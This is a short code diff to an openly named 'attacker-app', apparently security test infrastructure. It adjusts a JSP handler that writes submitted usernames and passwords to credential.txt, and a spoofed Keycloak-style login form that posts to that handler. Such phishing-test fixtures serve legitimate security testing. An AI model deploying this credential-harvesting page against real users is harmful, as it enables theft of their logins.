@@ -23,7 +23,7 @@
         String username = request.getParameter("username");
         String password = request.getParameter("password");
         if (username != null && password != null) {
-            String dir = "logs";
+            String dir = "tomcat/logs";
             String filename = "credential.txt";
             if (!Files.isDirectory(Paths.get(dir))) {
                 Files.createDirectory(Paths.get(dir));
@@ -77,7 +77,7 @@
                 <div id="kc-form">
                     <div id="kc-form-wrapper">
                         <form id="kc-form-login" onsubmit="login.disabled = true; return true;"
-                              action="http://<%=request.getServerName()%>:9080/attacker-app/index.jsp"
+                              action="/attacker-app/index.jsp"
                               method="post">
                             <div class="form-group">
                                 <label for="username" class="pf-c-form__label pf-c-form__label-text">Username or
